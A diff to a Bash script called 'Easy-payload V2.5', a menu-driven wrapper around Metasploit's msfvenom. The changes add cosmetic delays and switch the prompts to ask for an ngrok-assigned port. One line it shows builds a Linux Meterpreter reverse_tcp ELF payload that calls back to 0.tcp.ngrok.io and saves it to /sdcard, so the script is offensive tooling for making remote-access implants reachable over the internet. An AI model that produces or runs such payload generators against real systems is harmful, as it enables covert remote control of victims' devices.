@@ -22,8 +22,11 @@ echo -e "$yellow  /        \   <  "
 echo -e "$cyan /_______  /__|_ \ "
 echo -e "$grey         \/     \/ "
 #Official Sk script
+sleep 1
 echo -e "$red COPYRIGT - all rights reserved "
+sleep 1
 echo -e "$grey _____$blue Easy-$yellow payload-$grey V2.5____"
+sleep 2
 echo -e "$reset"
 echo -e "$reset"
 cd $HOME
@@ -57,25 +60,33 @@ echo -e "$yellow Credits……………"
 echo -e "$cyan 1> Suyash Khandare"
 echo -e "$green For Creating the Script"
 echo -e "$reset"
+sleep 2
 echo -e "$cyan 2> Lokesh Pandey"
 echo -e "$green For Giving Metasploit install Script"
 echo -e "$reset"
+sleep 2
 echo -e "$cyan 3) And You -$blue Keep Supporting"
 fi
 if [ $ch2 = '6' ];
 then
 clear
 echo -e "$yellow Changelog...."
+sleep 3
 echo -e "$grey V1.0"
+sleep 1
 echo -e "$reset"
 echo -e "$grey V1.2,$blue Minor Bug Fix"
+sleep 1
 echo -e "$reset"
 echo -e "$grey V1.5,$blue removed the password system"
+sleep 1
 echo -e "$reset"
 echo -e "$grey V2.0,$blue Added a WAN support"
 echo -e "$reset"
+sleep 1
 echo -e "$grey V2.2,$blue Fix the WAN payloads"
 echo -e "$reset"
+sleep 1
 echo -e "$grey V2.5,$blue Load the Easy Payload From any Terminal"
 fi
 if [ $ch2 = '4' ];
@@ -170,6 +181,8 @@ echo -e "$grey V2.5,$blue Load the Easy Payload From any Terminal"
 fi
 if [ $ch2 = '4' ];
 then
+read -p 'Pls Enter port Given By Ngrok:' lport
+echo -e "$grey [*] Please Wait Loading ..."
 cd $HOME
 cd metasploit-framework
 ruby msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport -f elf > /sdcard/sklinux.elf
@@ -178,7 +191,7 @@ echo -e "$green Payload Saved In Sdcard"
 fi
 if [ $ch2 = '3' ];
 then
-read -p 'Pls Enter LPORT:' lport
+read -p 'Pls Enter port Given By Ngrok:' lport
 echo -e "$grey [*] Please Wait Loading ..."
 cd $HOME
 cd metasploit-framework
@@ -188,7 +201,7 @@ echo -e "$green Payload Saved In Sdcard"
 fi
 if [ $ch2 = '2' ];
 then
-read -p 'Pls Enter LPORT:' lport
+read -p 'Pls Enter port Given by Ngrok:' lport
 echo -e "$grey [*] Please Wait Loading ..."
 cd $HOME
 cd metasploit-framework
@@ -198,7 +211,7 @@ echo -e "$green Payload Saved In Sdcard"
 fi
 if [ $ch2 = '1' ];
 then
-read -p 'Pls Enter LPORT:' lport
+read -p 'Pls Enter port Given By ngrok:' lport
 echo -e "$grey [*] Please Wait Loading ..."
 cd $HOME
 cd metasploit-framework
